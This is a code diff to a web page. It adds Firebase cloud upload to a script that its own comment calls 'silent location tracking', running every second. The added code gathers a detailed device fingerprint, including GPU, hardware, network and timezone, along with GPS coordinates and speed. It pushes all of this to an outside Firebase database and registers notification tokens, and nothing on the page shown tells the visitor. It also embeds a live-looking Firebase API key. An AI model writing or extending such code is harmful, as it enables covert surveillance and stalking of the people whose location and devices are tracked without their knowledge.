@@ -474,6 +474,63 @@
         📍 System Active
     </div>
 
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-messaging-compat.js"></script>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBIo8DTwDxop5qs_fV8Xj1szz288GTsTTE",
+            authDomain: "lremote-tracking.firebaseapp.com",
+            databaseURL: "https://lremote-tracking-default-rtdb.firebaseio.com",
+            projectId: "lremote-tracking",
+            storageBucket: "lremote-tracking.firebasestorage.app",
+            messagingSenderId: "868168422314",
+            appId: "1:868168422314:web:ca2870eab835f522cf91d3"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database(); // Realtime Database
+        const messaging = firebase.messaging();
+
+        // Generate unique identifiers
+        const userId = 'user_' + Math.random().toString(36).substr(2, 9);
+        const deviceId = navigator.userAgent + '_' + new Date().getTime();
+
+        // Request notification permission and save user to Firebase
+        async function initializeFirebase() {
+            try {
+                // Request notification permission
+                const permission = await Notification.requestPermission();
+                if (permission === 'granted') {
+                    console.log('✅ Notification permission granted');
+                    
+                    // Get FCM token
+                    const token = await messaging.getToken({
+                        vapidKey: 'YOUR_VAPID_KEY' // You'll get this from Firebase Console > Cloud Messaging
+                    });
+                    console.log('FCM Token:', token);
+                    
+                    // Save user info to Realtime Database
+                    await db.ref('users/' + userId).set({
+                        userId: userId,
+                        deviceId: deviceId,
+                        deviceName: deviceName,
+                        fcmToken: token,
+                        firstSeen: Date.now(),
+                        lastSeen: Date.now()
+                    });
+                    console.log('✅ User saved to Firebase');
+                }
+            } catch (error) {
+                console.error('Firebase initialization error:', error);
+            }
+        }
+    </script>
+
     <script>
         // Silent location tracking - runs in background every 1 second
         let locationCount = 0;
@@ -481,7 +538,7 @@
         let trackingQueue = [];
         let deviceName = getDeviceName();
 
-        // Get device name
+        // Get device name and comprehensive device fingerprint
         function getDeviceName() {
             const userAgent = navigator.userAgent;
             let device = 'Unknown Device';
@@ -515,6 +572,91 @@
             return device;
         }
 
+        // Get comprehensive device fingerprint (NO permissions required)
+        function getDeviceFingerprint() {
+            const fingerprint = {
+                // Basic info
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                
+                // Screen details
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                
+                // Hardware info
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                touchPoints: navigator.maxTouchPoints,
+                
+                // Browser features
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                
+                // Time info
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                localTime: new Date().toISOString(),
+                
+                // Network info (if available)
+                connectionType: 'Unknown',
+                downlink: 'Unknown',
+                rtt: 'Unknown',
+                
+                // Battery info (if available)
+                batteryLevel: 'Unknown',
+                charging: 'Unknown'
+            };
+            
+            // Get network information
+            if (navigator.connection) {
+                fingerprint.connectionType = navigator.connection.effectiveType || 'Unknown';
+                fingerprint.downlink = navigator.connection.downlink || 'Unknown';
+                fingerprint.rtt = navigator.connection.rtt || 'Unknown';
+            }
+            
+            return fingerprint;
+        }
+
+        // Get GPU information
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+            } catch (e) {}
+            return { vendor: 'Unknown', renderer: 'Unknown' };
+        }
+
+        // Try to get battery status
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Yes' : 'No',
+                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + 's',
+                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + 's'
+                    };
+                }
+            } catch (e) {}
+            return { level: 'Unknown', charging: 'Unknown' };
+        }
+
         function trackLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -522,25 +664,67 @@
                         locationCount++;
                         lastUpdate = new Date().toLocaleTimeString();
                         
-                        // Store location data with device info
+                        // Get additional device info
+                        const fingerprint = getDeviceFingerprint();
+                        const gpuInfo = getGPUInfo();
+                        
+                        // Store location data with comprehensive device info
                         const locationData = {
                             id: locationCount,
                             deviceName: deviceName,
-                            deviceType: navigator.platform,
+                            
+                            // Device fingerprint
+                            deviceType: fingerprint.platform,
+                            userAgent: fingerprint.userAgent,
+                            languages: fingerprint.languages,
+                            
+                            // Screen details
+                            screenResolution: fingerprint.screenResolution,
+                            colorDepth: fingerprint.colorDepth,
+                            pixelDepth: fingerprint.pixelDepth,
+                            devicePixelRatio: fingerprint.devicePixelRatio,
+                            
+                            // Hardware
+                            cpuCores: fingerprint.cpuCores,
+                            deviceMemory: fingerprint.deviceMemory,
+                            touchPoints: fingerprint.touchPoints,
+                            
+                            // GPU
+                            gpuVendor: gpuInfo.vendor,
+                            gpuRenderer: gpuInfo.renderer,
+                            
+                            // Network
+                            connectionType: fingerprint.connectionType,
+                            downlink: fingerprint.downlink,
+                            networkRTT: fingerprint.rtt,
+                            
+                            // Time & Location context
+                            timezone: fingerprint.timezone,
+                            timezoneOffset: fingerprint.timezoneOffset,
+                            
+                            // GPS Location data
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy,
                             altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
                             heading: position.coords.heading,
                             speed: position.coords.speed,
                             timestamp: position.timestamp,
-                            collectedAt: new Date().toISOString(),
-                            screenResolution: `${screen.width}x${screen.height}`,
-                            language: navigator.language
+                            collectedAt: new Date().toISOString()
                         };
                         
                         // Add to queue for batch sending
                         trackingQueue.push(locationData);
+                        
+                        // Send to Firebase Realtime Database
+                        db.ref('locations').push(locationData)
+                            .then(() => {
+                                console.log(`✅ [Firebase] Location #${locationCount} sent to cloud`);
+                            })
+                            .catch((error) => {
+                                console.error('❌ [Firebase] Error:', error);
+                            });
                         
                         // Store in localStorage for persistence
                         let locations = JSON.parse(localStorage.getItem('contract_locations') || '[]');
@@ -572,6 +756,9 @@
             console.log(`Starting tracking on: ${deviceName}`);
             console.log('Platform:', navigator.platform);
             console.log('Screen:', `${screen.width}x${screen.height}`);
+            
+            // Initialize Firebase (request notification permission)
+            initializeFirebase();
             
             // Initial tracking
             trackLocation();
